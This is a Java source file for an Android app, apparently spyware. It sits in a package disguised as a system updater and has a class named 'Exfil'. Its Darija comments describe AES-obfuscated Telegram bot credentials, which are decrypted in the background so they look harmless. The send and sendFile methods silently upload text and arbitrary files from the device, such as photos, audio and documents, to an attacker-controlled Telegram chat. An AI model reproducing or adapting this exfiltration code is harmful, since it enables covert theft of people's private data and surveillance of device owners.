package com.sys.updater;

import android.util.Base64;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Exfil {
    
    // 1. Hna fin kayn l'Token w l'Chat ID m-encryptin (Makhdoum b AES-256)
    // Had l'code kayban b7al chi chifra, walakin l'app kat-fokha f l'background.
    private static final String ENC_TOKEN = "HNA_KTEb_L_TOKEN_M_ENCRYPTE";
    private static final String ENC_CHAT_ID = "HNA_KTEb_L_CHAT_ID_M_ENCRYPTE";
    
    // Had l'clé hiya li kat-fok l'chifra (Khelliha mkhbeya)
    private static final String SECRET_KEY = "MySecretKey1234567890123456789012"; // Khassha tkoun 32 byte

    // 2. Fonction li kat-fok l'chifra
    private static String decrypt(String encryptedText) {
        try {
            byte[] keyBytes = SECRET_KEY.getBytes("UTF-8");
            SecretKeySpec secretKey = new SecretKeySpec(keyBytes, "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, secretKey);
            byte[] decodedBytes = Base64.decode(encryptedText, Base64.DEFAULT);
            byte[] decryptedBytes = cipher.doFinal(decodedBytes);
            return new String(decryptedBytes, "UTF-8");
        } catch (Exception e) {
            return "ERROR_DECRYPT"; 
        }
    }

    // 3. Send Text
    public static void send(String text) {
        new Thread(() -> {
            try {
                // Kan-fokow l'chifra hna f l'wa9t li kan-sifto
                String botToken = decrypt(ENC_TOKEN);
                String chatId = decrypt(ENC_CHAT_ID);

                String urlStr = "https://api.telegram.org/bot" + botToken + "/sendMessage";
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String postData = "chat_id=" + chatId + "&text=" + URLEncoder.encode(text, "UTF-8");
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(postData.getBytes());
                }
                conn.getInputStream().close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }
    
    // 4. Send File
    public static void sendFile(String filePath, String type, String caption) {
        new Thread(() -> {
            try {
                // Kan-fokow l'chifra hna f l'wa9t li kan-sifto
                String botToken = decrypt(ENC_TOKEN);
                String chatId = decrypt(ENC_CHAT_ID);

                String urlStr = "https://api.telegram.org/bot" + botToken + "/send" + type;
                String boundary = "*****";
                File file = new File(filePath);
                HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + chatId + "\r\n");
                if (caption != null && !caption.isEmpty()) {
                    dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
                }
                
                String fieldName = type.equals("Photo") ? "photo" : (type.equals("Audio") ? "audio" : "document");
                dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"" + fieldName + "\";filename=\"" + file.getName() + "\"\r\n\r\n");
                
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) dos.write(buffer, 0, bytesRead);
                fis.close();
                
                dos.writeBytes("\r\n--" + boundary + "--\r\n");
                dos.flush(); dos.close();
                conn.getInputStream().close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }
        }
